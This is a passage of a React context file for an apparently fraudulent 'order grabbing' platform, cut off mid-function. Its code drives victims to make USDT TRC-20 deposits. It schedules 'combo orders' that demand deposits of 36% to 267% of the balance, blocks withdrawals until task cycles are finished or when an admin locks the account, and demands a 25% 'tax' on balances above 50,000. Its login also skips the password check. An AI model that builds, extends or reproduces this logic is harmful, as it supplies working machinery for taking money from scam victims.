import React, { createContext, useContext, useEffect, useState } from 'react';
import {
  INITIAL_ADMINS,
  INITIAL_AUDIT_LOGS,
  INITIAL_DEPOSITS,
  INITIAL_INVITE_CODES,
  INITIAL_ORDERS,
  INITIAL_SYSTEM_CONFIG,
  INITIAL_USERS,
  INITIAL_WITHDRAWALS,
} from '../data/initialData';
import { generateTieredMatchedProducts, generateComboOrderProducts } from '../data/productCatalog';
import { getPlatformBalanceValidationMessage } from '../utils/balanceValidation';
import { LanguageCode, translations } from '../utils/i18n';
import {
  AdminPermission,
  AdminUser,
  AuditLog,
  CustomComboRule,
  DepositRecord,
  GrabbedOrder,
  InviteCode,
  SystemConfig,
  User,
  UserWallet,
  WithdrawalRecord,
} from '../types';

interface AppContextType {
  // Current user & auth
  currentUser: User | null;
  currentAdmin: AdminUser;
  activeView: 'user' | 'admin';
  setActiveView: (view: 'user' | 'admin') => void;
  deviceFrame: boolean;
  setDeviceFrame: (frame: boolean) => void;
  // Language & i18n
  language: LanguageCode;
  setLanguage: (lang: LanguageCode) => void;
  t: (key: string) => string;

  // Data lists
  users: User[];
  admins: AdminUser[];
  inviteCodes: InviteCode[];
  deposits: DepositRecord[];
  withdrawals: WithdrawalRecord[];
  orders: GrabbedOrder[];
  auditLogs: AuditLog[];
  systemConfig: SystemConfig;

  // Auth & User methods
  loginUser: (username: string, password?: string) => { success: boolean; message?: string };
  registerUser: (
    username: string,
    password: string,
    inviteCode: string
  ) => { success: boolean; message?: string; user?: User };
  logoutUser: () => void;
  switchUser: (userId: string) => void;
  updateUserAvatar: (avatarUrl: string) => void;
  setWithdrawalPassword: (password: string) => { success: boolean; message?: string };
  bindWallet: (wallet: Omit<UserWallet, 'boundAt'>) => { success: boolean; message?: string };
  submitDeposit: (
    amount: number,
    txid: string,
    depositAddress?: string
  ) => { success: boolean; message?: string };
  submitWithdrawal: (
    amount: number,
    withdrawalPassword: string,
    walletAddress?: string
  ) => { success: boolean; message?: string };
  addCompletedTasks: (count: number, userId?: string) => void;

  // Order Grabbing methods
  grabOrder: (vipTier: 'VIP 1' | 'VIP 2' | 'VIP 3') => {
    success: boolean;
    message?: string;
    order?: GrabbedOrder;
    isCycleLocked?: boolean;
    isComboOrder?: boolean;
    isMandatoryComboPending?: boolean;
  };
  submitOrder: (orderId: string) => {
    success: boolean;
    message?: string;
    isInsufficientComboBalance?: boolean;
    shortfall?: number;
    requiredAmount?: number;
    currentBalance?: number;
    isCycleNowFinished?: boolean;
  };

  // Admin methods
  switchAdmin: (adminId: string) => void;
  hasPermission: (permission: AdminPermission) => boolean;
  resetUserTaskCycle: (
    userId: string,
    toCycle1?: boolean
  ) => { success: boolean; message?: string };
  resetUserToFreshCycle: (userId: string) => { success: boolean; message?: string };
  toggleUserVip: (userId: string) => { success: boolean; message?: string };
  toggleUserLock: (userId: string) => { success: boolean; message?: string };
  setCustomUserCombos: (
    userId: string,
    combos: CustomComboRule[]
  ) => { success: boolean; message?: string };
  clearUserTax: (userId: string) => { success: boolean; message?: string };
  approveDeposit: (depositId: string) => { success: boolean; message?: string };
  rejectDeposit: (depositId: string, reason?: string) => { success: boolean; message?: string };
  approveWithdrawal: (withdrawalId: string) => { success: boolean; message?: string };
  rejectWithdrawal: (withdrawalId: string, reason?: string) => { success: boolean; message?: string };
  adjustUserBalance: (
    userId: string,
    amount: number,
    type: 'credit' | 'debit',
    reason: string
  ) => { success: boolean; message?: string };
  toggleUserStatus: (userId: string) => { success: boolean; message?: string };
  resetUserPassword: (
    userId: string,
    type: 'login' | 'withdrawal',
    newPass: string
  ) => { success: boolean; message?: string };
  generateInviteCode: (
    customCode?: string,
    maxUses?: number | null
  ) => { success: boolean; message?: string; code?: string };
  generateBulkInviteCodes: (
    count: number,
    prefix?: string
  ) => { success: boolean; message?: string; count?: number };
  toggleInviteCodeStatus: (codeId: string) => void;
  createSubAdmin: (
    username: string,
    name: string,
    permissions: AdminPermission[]
  ) => { success: boolean; message?: string };
  updateSubAdminPermissions: (
    adminId: string,
    permissions: AdminPermission[]
  ) => { success: boolean; message?: string };
  updateSystemConfig: (newConfig: Partial<SystemConfig>) => void;
  resetAllData: () => void;
}

const AppContext = createContext<AppContextType | undefined>(undefined);

const STORAGE_KEYS = {
  USERS: 'tradeweb_users_v4',
  ADMINS: 'tradeweb_admins_v4',
  INVITES: 'tradeweb_invites_v4',
  DEPOSITS: 'tradeweb_deposits_v4',
  WITHDRAWALS: 'tradeweb_withdrawals_v4',
  ORDERS: 'tradeweb_orders_v4',
  LOGS: 'tradeweb_logs_v4',
  CONFIG: 'tradeweb_config_v4',
  CURRENT_USER_ID: 'tradeweb_current_user_id_v4',
  CURRENT_ADMIN_ID: 'tradeweb_current_admin_id_v4',
};

export const AppProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  // Load state from localStorage or initial seed
  // Load state from localStorage or initial seed with daily reset check
  const [users, setUsers] = useState<User[]>(() => {
    const today = new Date().toISOString().substring(0, 10);
    const saved = localStorage.getItem(STORAGE_KEYS.USERS);
    if (!saved) {
      return INITIAL_USERS.map((u) => ({
        ...u,
        lastActiveDate: today,
        yesterdayCommission: u.yesterdayCommission ?? (u.todayCommission || 0),
      }));
    }
    try {
      const parsed = JSON.parse(saved) as User[];
      const existingIds = new Set(parsed.map((u) => u.id));
      const missingInitial = INITIAL_USERS.filter((u) => !existingIds.has(u.id));
      const combined = [...parsed, ...missingInitial];
      return combined.map((u) => {
        const isNewDay = u.lastActiveDate && u.lastActiveDate !== today;
        return {
          ...u,
          todayOrdersCount: isNewDay ? 0 : (u.todayOrdersCount ?? 0),
          todayCommission: isNewDay ? 0 : (u.todayCommission ?? 0),
          yesterdayCommission: isNewDay ? (u.todayCommission ?? 0) : (u.yesterdayCommission ?? 0),
          lastActiveDate: today,
          completedTasksCount: u.completedTasksCount ?? 0,
          currentCycleTasks:
            u.currentCycleTasks ?? (u.completedTasksCount >= 25 ? 25 : u.completedTasksCount ?? 0),
          cycleNumber: u.cycleNumber ?? 1,
          cycleApprovedByAdmin:
            u.cycleApprovedByAdmin ?? (u.currentCycleTasks !== undefined ? u.currentCycleTasks < 25 : true),
          comboOrderStep: u.comboOrderStep ?? 14,
        };
      });
    } catch {
      return INITIAL_USERS;
    }
  });

  const [admins, setAdmins] = useState<AdminUser[]>(() => {
    const saved = localStorage.getItem(STORAGE_KEYS.ADMINS);
    return saved ? JSON.parse(saved) : INITIAL_ADMINS;
  });

  const [inviteCodes, setInviteCodes] = useState<InviteCode[]>(() => {
    const saved = localStorage.getItem(STORAGE_KEYS.INVITES);
    return saved ? JSON.parse(saved) : INITIAL_INVITE_CODES;
  });

  const [deposits, setDeposits] = useState<DepositRecord[]>(() => {
    const saved = localStorage.getItem(STORAGE_KEYS.DEPOSITS);
    return saved ? JSON.parse(saved) : INITIAL_DEPOSITS;
  });

  const [withdrawals, setWithdrawals] = useState<WithdrawalRecord[]>(() => {
    const saved = localStorage.getItem(STORAGE_KEYS.WITHDRAWALS);
    return saved ? JSON.parse(saved) : INITIAL_WITHDRAWALS;
  });

  const [orders, setOrders] = useState<GrabbedOrder[]>(() => {
    const saved = localStorage.getItem(STORAGE_KEYS.ORDERS);
    return saved ? JSON.parse(saved) : INITIAL_ORDERS;
  });

  const [auditLogs, setAuditLogs] = useState<AuditLog[]>(() => {
    const saved = localStorage.getItem(STORAGE_KEYS.LOGS);
    return saved ? JSON.parse(saved) : INITIAL_AUDIT_LOGS;
  });

  const [systemConfig, setSystemConfig] = useState<SystemConfig>(() => {
    const saved = localStorage.getItem(STORAGE_KEYS.CONFIG);
    return saved ? JSON.parse(saved) : INITIAL_SYSTEM_CONFIG;
  });

  const [currentUserId, setCurrentUserId] = useState<string | null>(() => {
    return localStorage.getItem(STORAGE_KEYS.CURRENT_USER_ID) || 'user_1';
  });

  const [currentAdminId, setCurrentAdminId] = useState<string>(() => {
    return localStorage.getItem(STORAGE_KEYS.CURRENT_ADMIN_ID) || 'admin_super';
  });

  const [activeView, setActiveView] = useState<'user' | 'admin'>('user');
  const [deviceFrame, setDeviceFrame] = useState<boolean>(true);

  // Language & i18n
  const [language, setLanguageState] = useState<LanguageCode>(() => {
    const saved = localStorage.getItem('app_language');
    return (saved as LanguageCode) || 'en';
  });

  const setLanguage = (lang: LanguageCode) => {
    setLanguageState(lang);
    localStorage.setItem('app_language', lang);
  };

  const t = (key: string): string => {
    return translations[language]?.[key] || translations['en']?.[key] || key;
  };

  const updateUserAvatar = (avatarUrl: string) => {
    if (!currentUserId) return;
    setUsers((prev) =>
      prev.map((u) => (u.id === currentUserId ? { ...u, avatarUrl } : u))
    );
  };

  // Automatically reset "Today's Times" count to 0 at midnight (00:00 server time)
  useEffect(() => {
    const checkDailyReset = () => {
      const today = new Date().toISOString().substring(0, 10);
      setUsers((prev) => {
        let changed = false;
        const updated = prev.map((u) => {
          if (u.lastActiveDate && u.lastActiveDate !== today) {
            changed = true;
            return {
              ...u,
              todayOrdersCount: 0,
              yesterdayCommission: u.todayCommission || 0,
              todayCommission: 0,
              lastActiveDate: today,
            };
          }
          if (!u.lastActiveDate) {
            changed = true;
            return { ...u, lastActiveDate: today };
          }
          return u;
        });
        return changed ? updated : prev;
      });
    };

    checkDailyReset();
    const interval = setInterval(checkDailyReset, 30000); // Check every 30s
    return () => clearInterval(interval);
  }, []);

  // Sync to localStorage
  useEffect(() => {
    localStorage.setItem(STORAGE_KEYS.USERS, JSON.stringify(users));
  }, [users]);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEYS.ADMINS, JSON.stringify(admins));
  }, [admins]);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEYS.INVITES, JSON.stringify(inviteCodes));
  }, [inviteCodes]);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEYS.DEPOSITS, JSON.stringify(deposits));
  }, [deposits]);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEYS.WITHDRAWALS, JSON.stringify(withdrawals));
  }, [withdrawals]);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEYS.ORDERS, JSON.stringify(orders));
  }, [orders]);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEYS.LOGS, JSON.stringify(auditLogs));
  }, [auditLogs]);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEYS.CONFIG, JSON.stringify(systemConfig));
  }, [systemConfig]);

  useEffect(() => {
    if (currentUserId) {
      localStorage.setItem(STORAGE_KEYS.CURRENT_USER_ID, currentUserId);
    } else {
      localStorage.removeItem(STORAGE_KEYS.CURRENT_USER_ID);
    }
  }, [currentUserId]);

  useEffect(() => {
    localStorage.setItem(STORAGE_KEYS.CURRENT_ADMIN_ID, currentAdminId);
  }, [currentAdminId]);

  const currentUser = users.find((u) => u.id === currentUserId) || null;
  const currentAdmin = admins.find((a) => a.id === currentAdminId) || admins[0];

  // Helper to add audit log
  const logAuditAction = (
    action: AuditLog['action'],
    details: string,
    targetUserUid?: string
  ) => {
    const newLog: AuditLog = {
      id: 'log_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6),
      adminId: currentAdmin.id,
      adminUsername: currentAdmin.username,
      role: currentAdmin.role,
      action,
      details,
      targetUserUid,
      timestamp: new Date().toISOString().replace('T', ' ').substring(0, 19),
    };
    setAuditLogs((prev) => [newLog, ...prev]);
  };

  const hasPermission = (permission: AdminPermission): boolean => {
    if (currentAdmin.role === 'super_admin') return true;
    return currentAdmin.permissions.includes(permission);
  };

  // Generate unique 6-digit numeric UID
  const generateUniqueUid = (): string => {
    let candidate = '';
    let exists = true;
    while (exists) {
      candidate = Math.floor(100000 + Math.random() * 900000).toString();
      // eslint-disable-next-line @typescript-eslint/no-loop-func
      exists = users.some((u) => u.uid === candidate);
    }
    return candidate;
  };

  // --------------------------------------------------------------------------
  // USER AUTHENTICATION & PROFILE METHODS
  // --------------------------------------------------------------------------

  const loginUser = (username: string, _password?: string) => {
    const trimmed = username.trim();
    const user = users.find(
      (u) =>
        u.username.toLowerCase() === trimmed.toLowerCase() ||
        u.uid === trimmed
    );

    if (!user) {
      return { success: false, message: 'User account not found. Please register first.' };
    }
    if (user.status === 'frozen') {
      return { success: false, message: 'Your account is frozen. Please contact customer service.' };
    }

    setCurrentUserId(user.id);
    return { success: true };
  };

  const registerUser = (username: string, password: string, inviteCodeInput: string) => {
    const cleanUser = username.trim();
    const cleanCode = inviteCodeInput.trim().toUpperCase();

    if (!cleanUser) {
      return { success: false, message: 'Please enter a username.' };
    }
    if (!password || password.length < 4) {
      return { success: false, message: 'Password must be at least 4 characters.' };
    }
    if (!cleanCode) {
      return {
        success: false,
        message: 'Invitation code is required! Registration without a valid invitation code is prohibited.',
      };
    }

    // STRICT INVITATION CODE VALIDATION:
    // Code must match an active invite code (either system or user generated)
    const matchingCode = inviteCodes.find(
      (c) => c.code.toUpperCase() === cleanCode && c.status === 'active'
    );

    // Also check if any existing user has this inviteCode
    const matchingUser = users.find(
      (u) => u.inviteCode.toUpperCase() === cleanCode && u.status === 'active'
    );

    if (!matchingCode && !matchingUser) {
      return {
        success: false,
        message: 'Invalid Invitation Code. Please enter an active referral code provided by an admin or existing member.',
      };
    }

    // Check usage limits if system code with maxUses
    if (matchingCode && matchingCode.maxUses !== null && matchingCode.usageCount >= matchingCode.maxUses) {
      return {
        success: false,
        message: 'This invitation code has reached its maximum registration limit.',
      };
    }

    // Check if username already exists
    if (users.some((u) => u.username.toLowerCase() === cleanUser.toLowerCase())) {
      return { success: false, message: 'This username is already taken. Please choose another.' };
    }

    // Generate unique 6-digit UID
    const newUid = generateUniqueUid();
    // User's own invitation code is set to their unique UID (or uppercase string)
    const newUserInviteCode = newUid;

    // STATE RESET FOR NEW ACCOUNTS:
    // Ensure newly created account starts strictly at Cycle 1 / Progress 0 with only 1 combo planned for Task #14 or #15
    const plannedCycle1Combo = Math.random() < 0.5 ? 14 : 15;

    const newUser: User = {
      id: 'user_' + Date.now(),
      uid: newUid,
      username: cleanUser,
      password,
      withdrawalPassword: null, // initially null for security prompt flow
      inviteCode: newUserInviteCode,
      referredBy: cleanCode,
      balance: 0.0,
      frozenBalance: 0,
      vipLevel: 0,
      status: 'active',
      wallet: null,
      avatarUrl: '/assets/aistudio/a3.f53cf407_cf3e68d0.png',
      createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
      todayOrdersCount: 0,
      todayCommission: 0,
      completedTasksCount: 0,
      currentCycleTasks: 0, // Starts strictly at Cycle 1 / Progress 0
      cycleNumber: 1, // Starts strictly at Cycle 1
      cycleApprovedByAdmin: true,
      comboOrderStep: plannedCycle1Combo, // Strictly Task #14 or #15 (only 1 combo planned for Cycle 1)
      isVipAccount: false,
      isLockedAccount: false,
      customCombos: [],
    };

    // Add user's own invite code to inviteCodes pool
    const newCodeObj: InviteCode = {
      id: 'inv_user_' + Date.now(),
      code: newUserInviteCode,
      type: 'user',
      createdBy: `${newUid} (${cleanUser})`,
      creatorRole: 'user',
      usageCount: 0,
      maxUses: null,
      status: 'active',
      createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
    };

    // Increment usage on referrer code
    setInviteCodes((prev) => {
      const updated = prev.map((c) => {
        if (c.code.toUpperCase() === cleanCode) {
          return { ...c, usageCount: c.usageCount + 1 };
        }
        return c;
      });
      return [newCodeObj, ...updated];
    });

    setUsers((prev) => [newUser, ...prev]);
    setCurrentUserId(newUser.id);

    return {
      success: true,
      user: newUser,
      message: `Registration successful! Your UID is ${newUid} and your Referral Code is ${newUserInviteCode}.`,
    };
  };

  const logoutUser = () => {
    setCurrentUserId(null);
  };

  const switchUser = (userId: string) => {
    setCurrentUserId(userId);
  };

  const setWithdrawalPassword = (password: string) => {
    if (!currentUser) return { success: false, message: 'No user logged in.' };
    if (!password || password.length < 4) {
      return { success: false, message: 'Withdrawal password must be at least 4 digits.' };
    }

    setUsers((prev) =>
      prev.map((u) => (u.id === currentUser.id ? { ...u, withdrawalPassword: password } : u))
    );
    return { success: true, message: 'Withdrawal password set successfully!' };
  };

  const bindWallet = (walletData: Omit<UserWallet, 'boundAt'>) => {
    if (!currentUser) return { success: false, message: 'No user logged in.' };
    if (!walletData.walletAddress.startsWith('T') || walletData.walletAddress.length < 30) {
      return { success: false, message: 'Please enter a valid TRC-20 wallet address (starts with T).' };
    }

    const boundWallet: UserWallet = {
      ...walletData,
      boundAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
    };

    setUsers((prev) =>
      prev.map((u) => (u.id === currentUser.id ? { ...u, wallet: boundWallet } : u))
    );
    return { success: true, message: 'Wallet bound successfully!' };
  };

  // --------------------------------------------------------------------------
  // FINANCIAL METHODS (DEPOSIT & WITHDRAWAL)
  // --------------------------------------------------------------------------

  const submitDeposit = (amount: number, txid: string, depositAddress?: string) => {
    if (!currentUser) return { success: false, message: 'Please log in first.' };
    if (amount < systemConfig.minDeposit) {
      return {
        success: false,
        message: `Minimum deposit amount is ${systemConfig.minDeposit} USDT.`,
      };
    }

    const cleanTxid =
      txid.trim() ||
      'tx_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36);

    const targetAddress = depositAddress || systemConfig.trc20DepositAddress;

    const newDeposit: DepositRecord = {
      id: 'dep_' + Date.now(),
      userId: currentUser.id,
      userUid: currentUser.uid,
      username: currentUser.username,
      amount,
      currency: 'USDT',
      protocol: 'TRC-20',
      depositAddress: targetAddress,
      txid: cleanTxid,
      status: 'pending',
      createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
    };

    setDeposits((prev) => [newDeposit, ...prev]);
    return {
      success: true,
      message: 'Deposit voucher submitted! Please wait for admin verification (1-2 minutes).',
    };
  };

  const submitWithdrawal = (
    amount: number,
    withdrawalPasswordInput: string,
    walletAddressInput?: string
  ) => {
    if (!currentUser) return { success: false, message: 'Please log in first.' };

    // RULE: Account Lock Check
    // Locked accounts can complete tasks normally, but Withdrawal is strictly blocked
    // with a popup instructing user to contact Customer Service for Admin approval.
    if (currentUser.isLockedAccount) {
      return {
        success: false,
        message: 'ACCOUNT_LOCKED',
      };
    }

    // RULE: Mandatory 25% Tax Notice (> 50,000 USDT Balance)
    // When balance > 50,000 USDT: Block withdrawal attempts, trigger mandatory Tax Notice modal
    // requiring a 25% tax payment calculated on total balance before withdrawal can be unlocked.
    if (currentUser.balance > 50000 && !currentUser.taxPaid) {
      return {
        success: false,
        message: 'TAX_REQUIRED',
      };
    }

    // RULE: Incomplete Cycle Withdrawal Restriction
    // When a user requests a withdrawal, check if they have completed all 25 tasks in their active work cycle.
    // If total tasks completed in the current cycle is less than 25 (e.g., 24/25 tasks), BLOCK the withdrawal transaction.
    const currentCycleTasks = currentUser.currentCycleTasks ?? 0;
    if (currentCycleTasks < 25) {
      return {
        success: false,
        message: 'Please complete all 25 orders in your current task cycle before initiating a withdrawal.',
      };
    }

    // Step 2: Wallet check (no wallet bound)
    const targetAddress = walletAddressInput || currentUser.wallet?.walletAddress;
    if (!targetAddress) {
      return {
        success: false,
        message: 'NO_WALLET_SET',
      };
    }

    // Step 3: Password check (no withdrawal password set)
    if (!currentUser.withdrawalPassword) {
      return {
        success: false,
        message: 'NO_WITHDRAWAL_PASSWORD_SET',
      };
    }

    // Security verification: password correctness
    if (currentUser.withdrawalPassword !== withdrawalPasswordInput) {
      return { success: false, message: 'Incorrect withdrawal password.' };
    }

    // Minimum check
    if (amount < systemConfig.minWithdrawal) {
      return {
        success: false,
        message: `Minimum withdrawal amount is ${systemConfig.minWithdrawal} USDT.`,
      };
    }

    // Balance check
    if (currentUser.balance < amount) {
      return { success: false, message: 'Insufficient account balance.' };
    }

    // Step 4: IMMEDIATELY deduct amount from user balance
    setUsers((prev) =>
      prev.map((u) =>
        u.id === currentUser.id
          ? {
              ...u,
              balance: Number((u.balance - amount).toFixed(4)),
            }
          : u
      )
    );

    // Create record with status "Pending" in Withdrawal History
    const newWithdrawal: WithdrawalRecord = {
      id: 'wd_' + Date.now(),
      userId: currentUser.id,
      userUid: currentUser.uid,
      username: currentUser.username,
      amount,
      currency: 'USDT',
      protocol: 'TRC-20',
      walletAddress: targetAddress,
      status: 'pending',
      createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
    };

    setWithdrawals((prev) => [newWithdrawal, ...prev]);
    return {
      success: true,
      message: 'Withdrawal request submitted! Status: Pending review by Admin.',
    };
  };

  // --------------------------------------------------------------------------
  // VIP ORDER MATCHING / GRABBING ENGINE WITH COMBO LOGIC
  // --------------------------------------------------------------------------

  // Helper function to resolve combo order trigger rules:
  // - Cycle 1: 1 Combo at #14 or #15 (36% deposit requirement, 20% commission)
  // - Cycle 2: 3 Combos: #7 (55% dep / 26% comm), #15 (50% dep / 18% comm), #23 (50% dep / 18% comm)
  // - Cycle 3: 4 Combos: #7 (55% dep / 26% comm), #13, #18, #23 (50% dep / 18% comm each)
  // - VIP / Locked Accounts: 5 Combos (#8: 267%/81%, #15: 150%/81%, #19: 130%/81%, #23: 90%/81%, #25: 43%/83%)
  // - Custom Combos configured by Admin take highest priority
  const getComboRuleForUser = (
    user: User,
    taskNumber: number
  ): { isCombo: boolean; depositPercent: number; commissionPercent: number } | null => {
    // 1. Custom combos configured by Admin
    if (user.customCombos && user.customCombos.length > 0) {
      const match = user.customCombos.find((c) => c.stepNumber === taskNumber);
      if (match) {
        return {
          isCombo: true,
          depositPercent: match.requiredPercent,
          commissionPercent: match.commissionPercent,
        };
      }
      return null;
    }

    // 2. VIP or Locked Accounts: Trigger EXACTLY 5 Combo Orders schedule
    // (at Task #8, Task #15, Task #19, Task #23, and Task #25)
    if (user.isVipAccount || user.isLockedAccount) {
      switch (taskNumber) {
        case 8:
          return { isCombo: true, depositPercent: 267, commissionPercent: 81 };
        case 15:
          return { isCombo: true, depositPercent: 150, commissionPercent: 81 };
        case 19:
          return { isCombo: true, depositPercent: 130, commissionPercent: 81 };
        case 23:
          return { isCombo: true, depositPercent: 90, commissionPercent: 81 };
        case 25:
          return { isCombo: true, depositPercent: 43, commissionPercent: 83 };
        default:
          return null;
      }
    }

    const cycle = user.cycleNumber || 1;

    // 3. Cycle 1 (New Account / 1st Cycle): Trigger EXACTLY 1 Combo Order (only at Task #14 or Task #15).
    // DO NOT trigger any other combos in Cycle 1.
    if (cycle === 1) {
      const targetStep = user.comboOrderStep === 15 ? 15 : 14;
      if (taskNumber === targetStep) {
        return { isCombo: true, depositPercent: 36, commissionPercent: 20 };
      }
      return null;
    }

    // 4. Cycle 2 (2nd Cycle): Trigger EXACTLY 3 Combo Orders (at Task #7, Task #15, and Task #23).
    if (cycle === 2) {
      if (taskNumber === 7) {
        return { isCombo: true, depositPercent: 55, commissionPercent: 26 };
      }
      if (taskNumber === 15) {
        return { isCombo: true, depositPercent: 50, commissionPercent: 18 };
      }
      if (taskNumber === 23) {
        return { isCombo: true, depositPercent: 50, commissionPercent: 18 };
      }
      return null;
    }

    // 5. Subsequent Cycles (Cycle 3+): 4 Combo Orders at Tasks #7, #13, #18, #23
    if (cycle >= 3) {
      if (taskNumber === 7) {
        return { isCombo: true, depositPercent: 55, commissionPercent: 26 };
      }
      if (taskNumber === 13) {
        return { isCombo: true, depositPercent: 50, commissionPercent: 18 };
      }
      if (taskNumber === 18) {
        return { isCombo: true, depositPercent: 50, commissionPercent: 18 };
      }
      if (taskNumber === 23) {
        return { isCombo: true, depositPercent: 50, commissionPercent: 18 };
      }
      return null;
    }

    return null;
  };

  const grabOrder = (vipTier: 'VIP 1' | 'VIP 2' | 'VIP 3') => {
    if (!currentUser) return { success: false, message: 'Please login first.' };

    // RULE 1: 25-Task Work Cycle Check
    const currentTasks = currentUser.currentCycleTasks ?? 0;
    if (currentTasks >= 25 || !currentUser.cycleApprovedByAdmin) {
      return {
        success: false,
        isCycleLocked: true,
        message:
          'Work cycle completed! You have completed 25/25 tasks for this cycle. The task system is locked. Please contact Customer Support / Admin to approve and reset your next 25-task cycle.',
      };
    }

    // RULE: Mandatory Deposit Requirement & Incomplete Order Blocker:
    // When a Combo Order is triggered, user MUST deposit required deficit and submit before grabbing subsequent tasks.
    const incompleteOrder = orders.find(
      (o) => o.userId === currentUser.id && o.status === 'incomplete'
    );
    if (incompleteOrder) {
      if (incompleteOrder.isComboOrder) {
        const req = incompleteOrder.requiredBalance || incompleteOrder.orderAmount;
        const deficit = Number(Math.max(0, req - currentUser.balance).toFixed(2));
        return {
          success: false,
          isMandatoryComboPending: true,
          order: incompleteOrder,
          message: `Mandatory Combo Order #${incompleteOrder.comboStepNumber || 14} is pending! You must deposit the required deficit balance (${deficit > 0 ? deficit.toFixed(2) + ' USDT' : 'recharge complete'}) and submit this order before you can proceed to grab subsequent tasks.`,
        };
      }
      return {
        success: false,
        message: 'You have an unpaid order, please complete the payment first',
      };
    }

    // Determine platform
    const platform =
      vipTier === 'VIP 1' ? 'Amazon' : vipTier === 'VIP 2' ? 'Alibaba' : 'Aliexpress';

    // VIP Balance Rules matching screenshots & dynamic platform suggestions
    const bal = currentUser.balance;
    const balanceWarning = getPlatformBalanceValidationMessage(platform, bal);
    if (balanceWarning) {
      return {
        success: false,
        message: balanceWarning,
      };
    }

    const nextTaskNumber = currentTasks + 1;
    const comboRule = getComboRuleForUser(currentUser, nextTaskNumber);
    const isComboOrder = !!comboRule?.isCombo;

    let rate: number;
    let actualOrderAmt: number;
    let comm: number;
    let expected: number;
    let matchedItems: ReturnType<typeof generateTieredMatchedProducts>;
    let requiredBalance: number | undefined;
    let comboDepositPercent: number | undefined;
    let comboCommissionPercent: number | undefined;
    let requiredDepositDeficit: number | undefined;

    if (isComboOrder && comboRule) {
      // SPECIAL HIGH-COMMISSION COMBO ORDER
      comboDepositPercent = comboRule.depositPercent;
      comboCommissionPercent = comboRule.commissionPercent;
      // Deficit amount = (balance * comboDepositPercent) / 100
      requiredDepositDeficit = Number(((bal * comboRule.depositPercent) / 100).toFixed(2));
      requiredBalance = Number((bal + requiredDepositDeficit).toFixed(2));

      // Combo product set target matches the required balance (User Balance + Deposit Deficit)
      const combo = generateComboOrderProducts(bal, requiredBalance);
      matchedItems = combo.items;
      actualOrderAmt = combo.totalOrderAmount;

      // COMMISSION CALCULATION FIX:
      // Calculate Combo Order Commission based on the TOTAL ORDER AMOUNT (User Balance + Deposit Deficit), NOT just initial user balance.
      // Formula: Commission = Total Order Amount * Commission Percentage
      // Example: For Task #8 with 134.97 USDT Total Order Amount and 81% commission: 134.97 * 0.81 = 109.3257 USDT (~109.32 USDT)
      rate = Number((comboRule.commissionPercent / 100).toFixed(4));
      comm = Number(((actualOrderAmt * comboRule.commissionPercent) / 100).toFixed(4));
      expected = Number((actualOrderAmt + comm).toFixed(4));
    } else {
      // Standard VIP Order
      rate = vipTier === 'VIP 1' ? 0.04 : vipTier === 'VIP 2' ? 0.08 : 0.12;
      const targetOrderAmt = Number((bal * (0.55 + Math.random() * 0.25)).toFixed(2));
      matchedItems = generateTieredMatchedProducts(bal, targetOrderAmt);
      actualOrderAmt = Number(
        matchedItems.reduce((acc, item) => acc + item.unitPrice * item.quantity, 0).toFixed(2)
      );
      comm = Number((actualOrderAmt * rate).toFixed(4));
      expected = Number((actualOrderAmt + comm).toFixed(4));
    }

    // Order number format matching screenshot: e.g., 260111110013013260870
    const randomSuffix = Math.floor(100000000000000000 + Math.random() * 900000000000000000).toString();
    const orderNo = `260${randomSuffix}`;

    const newOrder: GrabbedOrder = {
      id: 'ord_' + Date.now(),
      orderNo,
      userId: currentUser.id,
      vipTier,
      platform,
      items: matchedItems,
      productTitle: isComboOrder
        ? `🔥 Special High-Commission Combo Order #${nextTaskNumber}`
        : matchedItems[0]?.name || 'Retail Matched Item',
      productImage: matchedItems[0]?.image || '/assets/aistudio/41lyVjfaJ7L._AC_UY218__3d4a1b42.jpg',
      unitPrice: matchedItems[0]?.unitPrice || 0.26,
      quantity: matchedItems[0]?.quantity || 100,
      orderAmount: actualOrderAmt,
      commissionRate: rate,
      commission: comm,
      expectedIncome: expected,
      status: 'incomplete',
      createdAt: new Date().toISOString().replace('T', ' ').substring(0, 19),
      isComboOrder,
      comboStepNumber: isComboOrder ? nextTaskNumber : undefined,
      requiredBalance,
      comboDepositPercent,
      comboCommissionPercent,
      requiredDepositDeficit,
    };

    setOrders((prev) => [newOrder, ...prev]);
    return { success: true, order: newOrder, isComboOrder };
  };

  const submitOrder = (orderId: string) => {
    const order = orders.find((o) => o.id === orderId);
    if (!order) return { success: false, message: 'Order not found.' };
    if (order.status === 'completed') return { success: false, message: 'Order already completed.' };

    const targetUser = users.find((u) => u.id === order.userId);
    if (!targetUser) return { success: false, message: 'User not found.' };

    // COMMISSION FORMULA: Total Order Amount * Commission Percentage for combo orders
    const calculatedCommission =
      order.isComboOrder && order.comboCommissionPercent
        ? Number(((order.orderAmount * order.comboCommissionPercent) / 100).toFixed(4))
        : order.commission;

    // MANDATORY COMBO DEFICIT CHECK:
    // Require account balance to match combo order value before successful submission
    if (order.isComboOrder) {
      const required = order.requiredBalance || order.orderAmount;
      if (targetUser.balance < required) {
        const shortfall = Number((required - targetUser.balance).toFixed(2));
        return {
          success: false,
          isInsufficientComboBalance: true,
          shortfall,
          requiredAmount: required,
          currentBalance: targetUser.balance,
          message: `Mandatory Deposit Deficit: ${shortfall.toFixed(2)} USDT required for Combo Order #${order.comboStepNumber || 14}! Required balance: ${required.toFixed(2)} USDT (Deposit Requirement: +${order.comboDepositPercent || 36}%), Current balance: ${targetUser.balance.toFixed(2)} USDT. Please deposit at least ${shortfall.toFixed(2)} USDT via TRC-20 to complete this combo order and collect +${calculatedCommission.toFixed(2)} USDT commission reward.`,
        };
      }
    }

    // Update order status to completed
    setOrders((prev) =>
      prev.map((o) =>
        o.id === orderId
          ? {
              ...o,
              commission: calculatedCommission,
